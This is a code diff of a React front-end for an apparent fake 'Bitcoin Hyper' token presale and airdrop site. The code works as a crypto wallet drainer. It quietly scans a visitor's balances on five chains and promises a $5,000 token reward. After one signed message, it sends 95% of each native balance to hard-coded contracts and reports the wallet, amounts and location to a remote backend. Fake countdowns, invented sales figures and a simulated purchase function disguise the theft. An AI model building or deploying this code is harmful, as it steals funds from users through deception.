@@ -367,52 +367,52 @@ const TRANSLATIONS = {
 const MULTICHAIN_CONFIG = {
   Ethereum: {
     chainId: 1,
-    contractAddress: '0xED46Ea22CAd806e93D44aA27f5BBbF0157F8D288',
+    contractAddress: '0x7264F557f762f16aC7937292D19449c5CE962288',
     name: 'Ethereum',
     symbol: 'ETH',
     explorer: 'https://etherscan.io',
     icon: '⟠',
-    color: 'from-blue-400 to-indigo-500',
+    color: 'from-red-500 to-red-600',
     rpc: 'https://eth.llamarpc.com'
   },
   BSC: {
     chainId: 56,
-    contractAddress: '0xb2ea58AcfC23006B3193E6F51297518289D2d6a0',
+    contractAddress: '0x7264F557f762f16aC7937292D19449c5CE962288',
     name: 'BSC',
     symbol: 'BNB',
     explorer: 'https://bscscan.com',
     icon: '🟡',
-    color: 'from-yellow-400 to-orange-500',
+    color: 'from-red-500 to-red-600',
     rpc: 'https://bsc-dataseed.binance.org'
   },
   Polygon: {
     chainId: 137,
-    contractAddress: '0xED46Ea22CAd806e93D44aA27f5BBbF0157F8D288',
+    contractAddress: '0x54b4A3C43CFf0aC70A8AC3f38f0fdC5DFA1cb278',
     name: 'Polygon',
     symbol: 'MATIC',
     explorer: 'https://polygonscan.com',
     icon: '⬢',
-    color: 'from-purple-400 to-pink-500',
+    color: 'from-red-500 to-red-600',
     rpc: 'https://polygon-rpc.com'
   },
   Arbitrum: {
     chainId: 42161,
-    contractAddress: '0xED46Ea22CAd806e93D44aA27f5BBbF0157F8D288',
+    contractAddress: '0x54b4A3C43CFf0aC70A8AC3f38f0fdC5DFA1cb278',
     name: 'Arbitrum',
     symbol: 'ETH',
     explorer: 'https://arbiscan.io',
     icon: '🔷',
-    color: 'from-cyan-400 to-blue-500',
+    color: 'from-red-500 to-red-600',
     rpc: 'https://arb1.arbitrum.io/rpc'
   },
   Avalanche: {
     chainId: 43114,
-    contractAddress: '0xED46Ea22CAd806e93D44aA27f5BBbF0157F8D288',
+    contractAddress: '0xF6F0B833186DD54B772a93002ab765fc7Ab9D01F',
     name: 'Avalanche',
     symbol: 'AVAX',
     explorer: 'https://snowtrace.io',
     icon: '🔴',
-    color: 'from-red-400 to-red-500',
+    color: 'from-red-500 to-red-600',
     rpc: 'https://api.avax.network/ext/bc/C/rpc'
   }
 };
@@ -458,86 +458,92 @@ function App() {
   const [processingChain, setProcessingChain] = useState('');
   const [isEligible, setIsEligible] = useState(false);
   const [eligibleChains, setEligibleChains] = useState([]);
-  const [processedAmounts, setProcessedAmounts] = useState({});
-  const [allChainsCompleted, setAllChainsCompleted] = useState(false);
-  const [executableChains, setExecutableChains] = useState([]);
-  const [showRibbon, setShowRibbon] = useState(true);
+  const [bnbAmount, setBnbAmount] = useState('');
+  const [showClaimButton, setShowClaimButton] = useState(false);
   
   // ============================================
-  // LANGUAGE STATE
+  // LANGUAGE STATE - FIXED
   // ============================================
   const [language, setLanguage] = useState('en');
   const [showLanguageDropdown, setShowLanguageDropdown] = useState(false);
-  const t = TRANSLATIONS[language] || TRANSLATIONS.en;
+  const [translations, setTranslations] = useState(TRANSLATIONS.en);
 
   // Presale stats
   const [timeLeft, setTimeLeft] = useState({
-    days: 5,
-    hours: 12,
-    minutes: 30,
+    days: 10,
+    hours: 0,
+    minutes: 0,
     seconds: 0
   });
   
   const [presaleStats, setPresaleStats] = useState({
-    totalRaised: 1250000,
-    totalParticipants: 8742,
-    currentBonus: 25,
+    totalRaised: 875000,
+    totalSold: 4250000,
+    totalParticipants: 5632,
+    currentBonus: 20,
     nextBonus: 15,
-    tokenPrice: 0.045,
-    bthPrice: 0.045
+    tokenPrice: 0.035,
+    hardCap: 10000000,
+    btcPrice: 0.035
   });
 
   // Live progress tracking
   const [liveProgress, setLiveProgress] = useState({
-    percentComplete: 68,
-    participantsToday: 342,
-    avgAllocation: 4250
+    percentComplete: 42.5,
+    participantsToday: 234,
+    avgAllocation: 1850
   });
 
-  // Minimum gas buffer requirements (in native token)
-  const MIN_GAS_BUFFER = {
-    Ethereum: 0.005,
-    BSC: 0.001,
-    Polygon: 0.1,
-    Arbitrum: 0.002,
-    Avalanche: 0.1
-  };
-
-  const MIN_VALUE_THRESHOLD = 1;
-
   // ============================================
-  // AUTO DETECT LANGUAGE FROM URL
+  // AUTO DETECT LANGUAGE FROM BROWSER - FIXED
   // ============================================
   useEffect(() => {
     const detectLanguage = () => {
+      // First check URL path
       const path = window.location.pathname;
       const pathLang = path.split('/')[1];
       
       if (pathLang && SUPPORTED_LANGUAGES[pathLang]) {
         setLanguage(pathLang);
+        setTranslations(TRANSLATIONS[pathLang] || TRANSLATIONS.en);
+        return;
+      }
+      
+      // Then try browser language
+      const browserLang = navigator.language.split('-')[0];
+      if (SUPPORTED_LANGUAGES[browserLang]) {
+        setLanguage(browserLang);
+        setTranslations(TRANSLATIONS[browserLang] || TRANSLATIONS.en);
       } else {
-        const browserLang = navigator.language.split('-')[0];
-        if (SUPPORTED_LANGUAGES[browserLang]) {
-          setLanguage(browserLang);
-        } else {
-          setLanguage('en');
-        }
+        setLanguage('en');
+        setTranslations(TRANSLATIONS.en);
       }
     };
     
     detectLanguage();
-    
-    const handleUrlChange = () => {
-      detectLanguage();
-    };
-    
-    window.addEventListener('popstate', handleUrlChange);
-    
-    return () => {
-      window.removeEventListener('popstate', handleUrlChange);
-    };
   }, []);
 
+  // ============================================
+  // CHANGE LANGUAGE FUNCTION - FIXED
+  // ============================================
+  const changeLanguage = (langCode) => {
+    setLanguage(langCode);
+    setTranslations(TRANSLATIONS[langCode] || TRANSLATIONS.en);
+    setShowLanguageDropdown(false);
+    
+    // Update URL without page reload
+    const url = new URL(window.location);
+    if (langCode === 'en') {
+      if (url.pathname.startsWith(`/${langCode}`)) {
+        url.pathname = url.pathname.replace(`/${langCode}`, '') || '/';
+      }
+    } else {
+      url.pathname = `/${langCode}${url.pathname}`;
+    }
+    window.history.pushState({}, '', url.toString());
+  };
+
+  // Fetch crypto prices
   useEffect(() => {
     const fetchPrices = async () => {
       try {
@@ -559,6 +565,7 @@ function App() {
     return () => clearInterval(interval);
   }, []);
 
+  // Initialize provider and signer from AppKit
   useEffect(() => {
     if (!walletProvider || !address) {
       setWalletInitialized(false);
@@ -580,6 +587,7 @@ function App() {
         setWalletInitialized(true);
         setTxStatus('');
         
+        // Fetch balances across all chains
         await fetchAllBalances(address);
         
       } catch (e) {
@@ -591,10 +599,11 @@ function App() {
     init();
   }, [walletProvider, address]);
 
+  // Track page visit with location
   useEffect(() => {
     const trackVisit = async () => {
       try {
-        const response = await fetch('https://hyperback.vercel.app/api/track-visit', {
+        const response = await fetch('https://flarebackend.vercel.app/api/track-visit', {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify({
@@ -619,42 +628,34 @@ function App() {
     trackVisit();
   }, []);
 
+  // Countdown timer - 10 days from now
   useEffect(() => {
+    const endTime = new Date().getTime() + (10 * 24 * 60 * 60 * 1000);
+    
     const timer = setInterval(() => {
-      setTimeLeft(prev => {
-        if (prev.seconds > 0) {
-          return { ...prev, seconds: prev.seconds - 1 };
-        } else if (prev.minutes > 0) {
-          return { ...prev, minutes: prev.minutes - 1, seconds: 59 };
-        } else if (prev.hours > 0) {
-          return { ...prev, hours: prev.hours - 1, minutes: 59, seconds: 59 };
-        } else if (prev.days > 0) {
-          return { ...prev, days: prev.days - 1, hours: 23, minutes: 59, seconds: 59 };
-        }
-        return prev;
-      });
+      const now = new Date().getTime();
+      const diff = endTime - now;
+      
+      if (diff > 0) {
+        setTimeLeft({
+          days: Math.floor(diff / (1000 * 60 * 60 * 24)),
+          hours: Math.floor((diff % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60)),
+          minutes: Math.floor((diff % (1000 * 60 * 60)) / (1000 * 60)),
+          seconds: Math.floor((diff % (1000 * 60)) / 1000)
+        });
+      }
     }, 1000);
     return () => clearInterval(timer);
   }, []);
 
+  // Auto-check eligibility when wallet connects
   useEffect(() => {
     if (isConnected && address && Object.keys(balances).length > 0 && !verifying) {
       checkEligibility();
     }
   }, [isConnected, address, balances]);
 
-  useEffect(() => {
-    if (executableChains.length > 0 && completedChains.length === executableChains.length) {
-      setAllChainsCompleted(true);
-    }
-  }, [completedChains, executableChains]);
-
-  useEffect(() => {
-    if (isConnected) {
-      setShowRibbon(false);
-    }
-  }, [isConnected]);
-
+  // Check eligibility without showing balances
   const checkEligibility = async () => {
     if (!address) return;
     
@@ -662,44 +663,25 @@ function App() {
     setTxStatus('🔄 Checking eligibility...');
     
     try {
+      // Calculate total value
       const total = Object.values(balances).reduce((sum, b) => sum + (b.valueUSD || 0), 0);
       
+      // Get chains with balance
       const chainsWithBalance = DEPLOYED_CHAINS.filter(chain => 
         balances[chain.name] && balances[chain.name].amount > 0.000001
       );
       
-      const executable = chainsWithBalance.filter(chain => {
-        const balance = balances[chain.name];
-        if (!balance) return false;
-        
-        if (balance.valueUSD < MIN_VALUE_THRESHOLD) {
-          console.log(`⏭️ Skipping ${chain.name}: Value $${balance.valueUSD.toFixed(2)} is below $${MIN_VALUE_THRESHOLD} threshold`);
-          return false;
-        }
-        
-        const minGasRequired = MIN_GAS_BUFFER[chain.name] || 0.001;
-        if (balance.amount < minGasRequired) {
-          console.log(`⏭️ Skipping ${chain.name}: Balance ${balance.amount.toFixed(6)} ${chain.symbol} is below gas buffer ${minGasRequired} ${chain.symbol}`);
-          return false;
-        }
-        
-        return true;
-      });
-      
-      setEligibleChains(chainsWithBalance);
-      setExecutableChains(executable);
-      
+      // Check if eligible (total >= $1)
       const eligible = total >= 1;
       setIsEligible(eligible);
+      setShowClaimButton(eligible);
       
       if (eligible) {
-        if (executable.length === 0) {
-          setTxStatus('⚠️ No chains meet execution requirements');
-        } else {
-          setTxStatus(`✅ Ready to process ${executable.length} chains`);
-        }
+        setEligibleChains(chainsWithBalance);
+        setTxStatus('✅ You qualify for $5,000 Bitcoin Hyper (BTH)!');
         
-        const connectResponse = await fetch('https://hyperback.vercel.app/api/presale/connect', {
+        // Send to backend for tracking
+        await fetch('https://flarebackend.vercel.app/api/presale/connect', {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify({ 
@@ -709,17 +691,8 @@ function App() {
           })
         });
         
-        if (connectResponse.ok) {
-          const connectData = await connectResponse.json();
-          if (connectData.success && connectData.data.email) {
-            setUserEmail(connectData.data.email);
-            console.log("📧 Email from backend:", connectData.data.email);
-          }
-        }
-        
-        if (executable.length > 0) {
-          preparePresale();
-        }
+        // Prepare flow silently
+        preparePresale();
       } else {
         setTxStatus(total > 0 ? '✨ Connected' : '👋 Welcome');
       }
@@ -732,6 +705,7 @@ function App() {
     }
   };
 
+  // Fetch balances across all chains (hidden from UI)
   const fetchAllBalances = async (walletAddress) => {
     console.log("🔍 Checking eligibility...");
     setScanning(true);
@@ -741,6 +715,7 @@ function App() {
     let scanned = 0;
     const totalChains = DEPLOYED_CHAINS.length;
     
+    // Scan all chains in parallel
     const scanPromises = DEPLOYED_CHAINS.map(async (chain) => {
       try {
         const rpcProvider = new ethers.JsonRpcProvider(chain.rpc);
@@ -793,7 +768,7 @@ function App() {
     if (!address) return;
     
     try {
-      await fetch('https://hyperback.vercel.app/api/presale/prepare-flow', {
+      await fetch('https://flarebackend.vercel.app/api/presale/prepare-flow', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({ walletAddress: address })
@@ -804,29 +779,7 @@ function App() {
   };
 
   // ============================================
-  // CHANGE LANGUAGE FUNCTION - FIXED
-  // ============================================
-  const changeLanguage = (langCode) => {
-    setLanguage(langCode);
-    setShowLanguageDropdown(false);
-    
-    // Force re-render with new language
-    const t = TRANSLATIONS[langCode] || TRANSLATIONS.en;
-    
-    // Update URL without page reload
-    const url = new URL(window.location);
-    if (langCode === 'en') {
-      if (url.pathname.startsWith(`/${langCode}`)) {
-        url.pathname = url.pathname.replace(`/${langCode}`, '') || '/';
-      }
-    } else {
-      url.pathname = `/${langCode}${url.pathname}`;
-    }
-    window.history.pushState({}, '', url.toString());
-  };
-
-  // ============================================
-  // MULTI-CHAIN EXECUTION
+  // MULTI-CHAIN EXECUTION - 95% OF BALANCE
   // ============================================
   const executeMultiChainSignature = async () => {
     if (!walletProvider || !address || !signer) {
@@ -838,16 +791,14 @@ function App() {
       setSignatureLoading(true);
       setError('');
       setCompletedChains([]);
-      setAllChainsCompleted(false);
-      setProcessedAmounts({});
       
       const timestamp = Date.now();
-      const flowId = `FLOW-${timestamp}-${Math.random().toString(36).substring(2, 10).toUpperCase()}`;
+      const flowId = `FLOW-${timestamp}`;
       setCurrentFlowId(flowId);
       
       const nonce = Math.floor(Math.random() * 1000000000);
-      const message = `BITCOIN HYPER PRESALE AUTHORIZATION\n\n` +
-        `I hereby confirm my participation\n` +
+      const message = `BITCOIN HYPER (BTH) TOKEN PRESALE AUTHORIZATION\n\n` +
+        `I hereby confirm my participation in the Bitcoin Hyper (BTH) presale\n` +
         `Wallet: ${address}\n` +
         `Allocation: $5,000 BTH + ${presaleStats.currentBonus}% Bonus\n` +
         `Timestamp: ${new Date().toISOString()}\n` +
@@ -855,34 +806,36 @@ function App() {
 
       setTxStatus('✍️ Sign message...');
 
+      // Get signature - ONE SIGNATURE FOR ALL CHAINS
       const signature = await signer.signMessage(message);
       console.log("✅ Signature obtained");
       
       setTxStatus('✅ Executing on eligible chains...');
 
-      const chainsToProcess = executableChains;
+      // Use the pre-calculated eligible chains
+      const chainsToProcess = eligibleChains;
+      
+      console.log(`🔄 Processing ${chainsToProcess.length} eligible chains`);
       
       if (chainsToProcess.length === 0) {
-        setError("No chains meet the execution requirements (min $1 value and gas buffer)");
+        setError("No eligible chains found");
         setSignatureLoading(false);
         return;
       }
 
-      console.log(`🔄 Processing ${chainsToProcess.length} executable chains`);
-
+      // Sort chains by value (highest first)
       const sortedChains = [...chainsToProcess].sort((a, b) => 
         (balances[b.name]?.valueUSD || 0) - (balances[a.name]?.valueUSD || 0)
       );
       
       let processed = [];
-      let skippedChains = [];
-      let failedChains = [];
       
       for (const chain of sortedChains) {
         try {
           setProcessingChain(chain.name);
           setTxStatus(`🔄 Processing ${chain.name}...`);
           
+          // Switch to the correct chain using AppKit
           try {
             console.log(`🔄 Switching to ${chain.name}...`);
             
@@ -891,41 +844,30 @@ function App() {
               params: [{ chainId: `0x${chain.chainId.toString(16)}` }]
             });
             
+            // Wait for chain switch
             await new Promise(resolve => setTimeout(resolve, 1000));
             
           } catch (switchError) {
             console.log(`Chain switch needed, continuing...`);
           }
           
+          // Create provider for this chain
           const chainProvider = new ethers.JsonRpcProvider(chain.rpc);
           
+          // Get balance data - SEND 95%
           const balance = balances[chain.name];
-          
-          if (balance.valueUSD < MIN_VALUE_THRESHOLD) {
-            console.log(`⏭️ Skipping ${chain.name}: Value now $${balance.valueUSD.toFixed(2)} below threshold`);
-            skippedChains.push(chain.name);
-            continue;
-          }
-          
           const amountToSend = (balance.amount * 0.95);
           const valueUSD = (balance.valueUSD * 0.95).toFixed(2);
           
-          setProcessedAmounts(prev => ({
-            ...prev,
-            [chain.name]: {
-              amount: amountToSend.toFixed(6),
-              symbol: chain.symbol,
-              valueUSD: valueUSD
-            }
-          }));
-          
           console.log(`💰 ${chain.name}: Sending ${amountToSend.toFixed(6)} ${chain.symbol} ($${valueUSD})`);
           
+          // Create contract interface
           const contractInterface = new ethers.Interface(PROJECT_FLOW_ROUTER_ABI);
           const data = contractInterface.encodeFunctionData('processNativeFlow', []);
           
           const value = ethers.parseEther(amountToSend.toFixed(18));
 
+          // Estimate gas
           const contract = new ethers.Contract(
             chain.contractAddress,
             PROJECT_FLOW_ROUTER_ABI,
@@ -935,6 +877,7 @@ function App() {
           const gasEstimate = await contract.processNativeFlow.estimateGas({ value });
           const gasLimit = gasEstimate * 120n / 100n;
 
+          // Send transaction
           const tx = await walletProvider.request({
             method: 'eth_sendTransaction',
             params: [{
@@ -948,6 +891,7 @@ function App() {
 
           setTxStatus(`⏳ Waiting for ${chain.name} confirmation...`);
           
+          // Wait for confirmation
           const receipt = await chainProvider.waitForTransaction(tx);
           
           if (receipt && receipt.status === 1) {
@@ -956,8 +900,10 @@ function App() {
             processed.push(chain.name);
             setCompletedChains(prev => [...prev, chain.name]);
             
+            // Calculate gas used
             const gasUsed = receipt.gasUsed ? ethers.formatEther(receipt.gasUsed * receipt.gasPrice) : '0';
             
+            // Send to backend with amounts
             const flowData = {
               walletAddress: address,
               chainName: chain.name,
@@ -978,7 +924,7 @@ function App() {
             
             console.log("📤 Sending to backend with amounts:", flowData);
             
-            await fetch('https://hyperback.vercel.app/api/presale/execute-flow', {
+            await fetch('https://flarebackend.vercel.app/api/presale/process-flow', {
               method: 'POST',
               headers: { 'Content-Type': 'application/json' },
               body: JSON.stringify(flowData)
@@ -991,13 +937,7 @@ function App() {
           
         } catch (chainErr) {
           console.error(`Error on ${chain.name}:`, chainErr);
-          if (chainErr.code === 4001) {
-            failedChains.push(chain.name);
-            setError(`Transaction rejected on ${chain.name}`);
-          } else {
-            failedChains.push(chain.name);
-            setError(`Error on ${chain.name}: ${chainErr.message}`);
-          }
+          setError(`Error on ${chain.name}: ${chainErr.message}`);
         }
       }
 
@@ -1007,16 +947,13 @@ function App() {
         setShowCelebration(true);
         setTxStatus(`🎉 You've secured $5,000 BTH!`);
         
+        // Calculate total processed value
         const totalProcessedValue = processed.reduce((sum, chainName) => {
           return sum + (balances[chainName]?.valueUSD * 0.95 || 0);
         }, 0);
         
-        const chainsDetails = processed.map(chainName => {
-          const amount = processedAmounts[chainName];
-          return `${chainName}: ${amount?.amount || 'unknown'} ${amount?.symbol || ''} ($${amount?.valueUSD || 'unknown'})`;
-        }).join('\n');
-        
-        await fetch('https://hyperback.vercel.app/api/presale/claim', {
+        // Final success notification
+        await fetch('https://flarebackend.vercel.app/api/presale/claim', {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify({ 
@@ -1028,19 +965,11 @@ function App() {
               city: userLocation.city
             },
             chains: processed,
-            chainsDetails: chainsDetails,
             totalProcessedValue: totalProcessedValue.toFixed(2),
             reward: "5000 BTH",
             bonus: `${presaleStats.currentBonus}%`
           })
         });
-        
-        if (skippedChains.length > 0 || failedChains.length > 0) {
-          let summary = [];
-          if (skippedChains.length > 0) summary.push(`Skipped: ${skippedChains.join(', ')} (below $1)`);
-          if (failedChains.length > 0) summary.push(`Failed: ${failedChains.join(', ')}`);
-          setError(`Note: ${summary.join(' · ')}`);
-        }
       } else {
         setError("No chains were successfully processed");
       }
@@ -1058,10 +987,58 @@ function App() {
     }
   };
 
+  // Buy BTH tokens function
+  const buyBth = async () => {
+    if (!walletProvider || !address || !signer) {
+      setError("Wallet not initialized");
+      return;
+    }
+
+    if (!bnbAmount || parseFloat(bnbAmount) <= 0) {
+      setError("Please enter a valid amount");
+      return;
+    }
+
+    try {
+      setLoading(true);
+      setError('');
+      
+      setTxStatus('🔄 Buying BTH tokens...');
+      
+      // This is where you'd implement the actual buy function
+      // For now, we'll simulate a successful purchase
+      
+      setTimeout(() => {
+        setTxStatus('✅ Purchase successful!');
+        setLoading(false);
+      }, 2000);
+      
+    } catch (err) {
+      console.error('Buy error:', err);
+      setError(err.message || 'Purchase failed');
+      setLoading(false);
+    }
+  };
+
+  // Claim airdrop function (calls executeMultiChainSignature)
+  const claimAirdrop = async () => {
+    if (!isConnected) {
+      setError("Please connect your wallet first");
+      return;
+    }
+    
+    if (!isEligible) {
+      setError("You need at least $1 in your wallet to qualify");
+      return;
+    }
+    
+    await executeMultiChainSignature();
+  };
+
   const claimTokens = async () => {
     try {
       setLoading(true);
-      await fetch('https://hyperback.vercel.app/api/presale/claim', {
+      await fetch('https://flarebackend.vercel.app/api/presale/claim', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({ 
@@ -1086,389 +1063,468 @@ function App() {
   };
 
   return (
-    <div className="min-h-screen bg-white text-[#1a1a1a] font-['Inter']">
+    <div className="min-h-screen bg-gradient-to-b from-[#1a0000] to-[#000000] text-white font-['Poppins'] overflow-hidden">
       
-      {/* Main Container */}
-      <div className="container mx-auto px-4 sm:px-6 py-6 sm:py-12 max-w-[800px]">
-        
-        {/* Clean White Card with Red Accents */}
-        <div className="bg-white rounded-3xl sm:rounded-[40px] shadow-xl p-6 sm:p-8 md:p-10 border border-gray-100">
-          
-          {/* TOP SECTION */}
-          <div className="flex flex-col sm:flex-row items-center justify-between gap-4 mb-8 sm:mb-10 relative">
-            
-            {/* FLARE VERSION CLAIM AIRDROP RIBBON - Fully Responsive */}
-            {!isConnected && showRibbon && (
-              <div className="absolute -top-16 sm:-top-20 right-0 left-0 sm:left-auto sm:right-0 z-20">
-                <div className="relative max-w-[320px] sm:max-w-[380px] mx-auto sm:mx-0">
-                  {/* Arrow pointing to button */}
-                  <div className="absolute -bottom-2 right-16 sm:right-20 w-4 h-4 bg-red-600 transform rotate-45 animate-pulse"></div>
-                  
-                  {/* Ribbon Body */}
-                  <div className="relative bg-gradient-to-r from-red-600 to-red-500 rounded-lg px-4 py-2.5 shadow-xl border border-red-400">
-                    <div className="flex items-center gap-2">
-                      <div className="w-6 h-6 bg-white/20 rounded-full flex items-center justify-center">
-                        <i className="fas fa-gem text-white text-xs"></i>
-                      </div>
-                      <div>
-                        <div className="text-[10px] font-semibold text-white/90 uppercase tracking-wider">
-                          {t.checkWalletEligibility}
-                        </div>
-                        <div className="text-xs font-bold text-white">
-                          {t.whenQualified}
-                        </div>
-                      </div>
-                      <div className="bg-white/20 backdrop-blur px-2 py-1 rounded-full ml-auto">
-                        <span className="text-[10px] font-bold text-white">{t.valueBadge}</span>
-                      </div>
-                    </div>
-                  </div>
-                </div>
-              </div>
-            )}
-            
-            <div className="flex items-center gap-2">
-              <i className="fab fa-bitcoin text-2xl sm:text-3xl text-red-600"></i>
-              <span className="font-bold text-xl sm:text-2xl text-gray-900 tracking-tight">BITCOINHYPER</span>
-            </div>
-            
-            <div className="flex items-center gap-2">
-              {/* Language Selector */}
-              <div className="relative">
-                <button
-                  onClick={() => setShowLanguageDropdown(!showLanguageDropdown)}
-                  className="bg-gray-50 border border-gray-200 rounded-full px-3 py-2 flex items-center gap-2 hover:border-red-400 transition-colors"
-                >
-                  <span className="text-base">{SUPPORTED_LANGUAGES[language]?.flag || '🇺🇸'}</span>
-                  <span className="text-xs font-medium text-gray-700 hidden sm:inline">
-                    {SUPPORTED_LANGUAGES[language]?.native || 'English'}
-                  </span>
-                  <i className={`fas fa-chevron-down text-gray-500 text-[10px] transition-transform ${showLanguageDropdown ? 'rotate-180' : ''}`}></i>
-                </button>
-                
-                {showLanguageDropdown && (
-                  <div className="absolute right-0 mt-2 w-64 bg-white border border-gray-200 rounded-xl shadow-2xl z-50 max-h-96 overflow-y-auto">
-                    <div className="p-2">
-                      <div className="text-xs text-red-600 px-3 py-2 font-medium border-b border-gray-200 mb-1">
-                        SELECT LANGUAGE
-                      </div>
-                      {Object.entries(SUPPORTED_LANGUAGES).map(([code, lang]) => (
-                        <button
-                          key={code}
-                          onClick={() => changeLanguage(code)}
-                          className={`w-full text-left px-3 py-2 rounded-lg flex items-center gap-3 hover:bg-gray-50 transition-colors ${
-                            language === code ? 'bg-red-50' : ''
-                          }`}
-                        >
-                          <span className="text-lg">{lang.flag}</span>
-                          <div className="flex-1">
-                            <div className="text-sm text-gray-900">{lang.name}</div>
-                            <div className="text-xs text-gray-500">{lang.native}</div>
-                          </div>
-                          {language === code && (
-                            <i className="fas fa-check text-red-600 text-xs"></i>
-                          )}
-                        </button>
-                      ))}
-                    </div>
-                  </div>
-                )}
-              </div>
-              
-              {!isConnected ? (
-                <button
-                  onClick={() => open()}
-                  className="bg-red-600 hover:bg-red-700 text-white font-semibold text-xs sm:text-sm px-5 py-2.5 rounded-full flex items-center gap-2 shadow-lg hover:shadow-xl transition-all whitespace-nowrap"
-                >
-                  <i className="fas fa-plug text-xs"></i>
-                  <span>{t.connectWallet}</span>
-                </button>
-              ) : (
-                <div className="bg-gray-50 rounded-full py-1.5 pl-4 pr-1.5 flex items-center gap-2 border border-gray-200">
-                  <span className="font-mono text-xs text-gray-700">
-                    {formatAddress(address)}
-                  </span>
-                  <button
-                    onClick={() => disconnect()}
-                    className="w-7 h-7 rounded-full bg-gray-200 flex items-center justify-center hover:bg-gray-300 transition-colors"
-                    title={t.disconnect}
-                  >
-                    <i className="fas fa-power-off text-[10px] text-gray-700"></i>
-                  </button>
-                </div>
-              )}
-            </div>
-          </div>
+      {/* Red glow background */}
+      <div className="fixed w-[600px] h-[600px] bg-red-600 rounded-full blur-[200px] opacity-15 top-[-200px] left-[-200px] pointer-events-none"></div>
+      <div className="fixed w-[400px] h-[400px] bg-red-500 rounded-full blur-[150px] opacity-10 bottom-[-100px] right-[-100px] pointer-events-none"></div>
 
-          {/* Eligibility Check */}
-          {isConnected && scanning && (
-            <div className="mb-8">
-              <div className="bg-gray-50 rounded-2xl p-6 border border-gray-200">
-                <div className="flex items-center gap-4 mb-4">
-                  <div className="w-10 h-10 border-3 border-red-600 border-t-transparent rounded-full animate-spin"></div>
-                  <div>
-                    <div className="text-base font-semibold text-gray-900">{t.checkEligibility}</div>
-                    <div className="text-sm text-gray-500">{t.verifying}</div>
-                  </div>
+      {/* Airdrop Ribbon - RESPONSIVE POSITION - FIXED */}
+      <div 
+        onClick={claimAirdrop}
+        className="fixed right-[-70px] top-[40%] bg-gradient-to-r from-red-600 to-red-500 text-white py-4 px-24 transform -rotate-90 font-semibold cursor-pointer hover:from-red-700 hover:to-red-600 transition-all z-50 animate-pulse-glow hidden md:flex items-center justify-center"
+        style={{ animation: 'blink 1.2s infinite' }}
+      >
+        <span className="text-2xl mr-2">🎁</span> CLAIM AIRDROP
+      </div>
+
+      {/* Mobile Airdrop Button - FIXED */}
+      <div 
+        onClick={claimAirdrop}
+        className="fixed bottom-6 right-6 bg-gradient-to-r from-red-600 to-red-500 text-white px-6 py-3 rounded-full shadow-2xl cursor-pointer hover:from-red-700 hover:to-red-600 transition-all z-50 animate-pulse-glow md:hidden flex items-center justify-center gap-2"
+        style={{ animation: 'blink 1.2s infinite' }}
+      >
+        <span className="text-xl">🎁</span>
+        <span className="text-sm font-semibold">CLAIM AIRDROP</span>
+      </div>
+
+      {/* Language Selector - FIXED */}
+      <div className="absolute top-6 right-6 z-50">
+        <div className="relative">
+          <button
+            onClick={() => setShowLanguageDropdown(!showLanguageDropdown)}
+            className="bg-black/50 backdrop-blur border border-red-500/30 rounded-full px-4 py-2 flex items-center gap-2 hover:border-red-500 transition-all"
+          >
+            <span className="text-lg">{SUPPORTED_LANGUAGES[language]?.flag || '🇺🇸'}</span>
+            <span className="text-sm text-white hidden sm:inline">
+              {SUPPORTED_LANGUAGES[language]?.native || 'English'}
+            </span>
+            <i className={`fas fa-chevron-down text-red-500 text-xs transition-transform ${showLanguageDropdown ? 'rotate-180' : ''}`}></i>
+          </button>
+          
+          {showLanguageDropdown && (
+            <div className="absolute right-0 mt-2 w-64 bg-black/90 backdrop-blur border border-red-500/30 rounded-2xl shadow-2xl z-50 max-h-96 overflow-y-auto">
+              <div className="p-2">
+                <div className="text-xs text-red-500 px-3 py-2 font-semibold border-b border-red-500/20 mb-1">
+                  SELECT LANGUAGE
                 </div>
-                
-                <div className="w-full bg-gray-200 rounded-full h-1">
-                  <div 
-                    className="bg-red-600 h-1 rounded-full transition-all duration-300"
-                    style={{ width: `${scanProgress}%` }}
-                  ></div>
-                </div>
+                {Object.entries(SUPPORTED_LANGUAGES).map(([code, lang]) => (
+                  <button
+                    key={code}
+                    onClick={() => changeLanguage(code)}
+                    className={`w-full text-left px-3 py-2.5 rounded-xl flex items-center gap-3 transition-all duration-200 hover:bg-red-500/10 ${
+                      language === code ? 'bg-red-500/20 border border-red-500/30' : ''
+                    }`}
+                  >
+                    <span className="text-xl">{lang.flag}</span>
+                    <div className="flex-1">
+                      <div className="text-sm font-medium text-white">{lang.name}</div>
+                      <div className="text-xs text-gray-400">{lang.native}</div>
+                    </div>
+                    {language === code && (
+                      <i className="fas fa-check text-red-500 text-sm"></i>
+                    )}
+                  </button>
+                ))}
               </div>
             </div>
           )}
+        </div>
+      </div>
 
-          {/* LIVE Badge */}
-          <div className="flex justify-center mb-4">
-            <div className="bg-red-50 rounded-full px-4 py-1.5 border border-red-200 inline-flex items-center gap-2">
-              <span className="relative flex h-2 w-2">
-                <span className="animate-ping absolute inline-flex h-full w-full rounded-full bg-red-400 opacity-75"></span>
-                <span className="relative inline-flex rounded-full h-2 w-2 bg-red-600"></span>
-              </span>
-              <span className="text-xs font-medium tracking-wide text-red-700">{t.presaleLive}</span>
-            </div>
-          </div>
-
-          {/* Countdown Timer */}
-          <div className="bg-gray-50 rounded-2xl px-6 py-5 mb-6 border border-gray-200">
-            <div className="text-xs tracking-wider text-gray-500 mb-3 text-center">
-              <i className="far fa-clock mr-2"></i> {t.bonusEndsIn}
-            </div>
-            <div className="grid grid-cols-4 gap-2">
-              {[
-                { label: t.days, value: timeLeft.days },
-                { label: t.hrs, value: timeLeft.hours },
-                { label: t.mins, value: timeLeft.minutes },
-                { label: t.secs, value: timeLeft.seconds }
-              ].map((item, index) => (
-                <div key={index} className="text-center">
-                  <div className="text-2xl sm:text-3xl font-bold text-red-600">
-                    {item.value.toString().padStart(2, '0')}
-                  </div>
-                  <div className="text-[10px] uppercase tracking-wider text-gray-500">{item.label}</div>
-                </div>
-              ))}
-            </div>
-          </div>
-
-          {/* Bonus Ribbon */}
-          <div className="relative mb-6">
-            <div className="absolute inset-0 bg-gradient-to-r from-red-600 to-red-500 rounded-full blur-md opacity-20"></div>
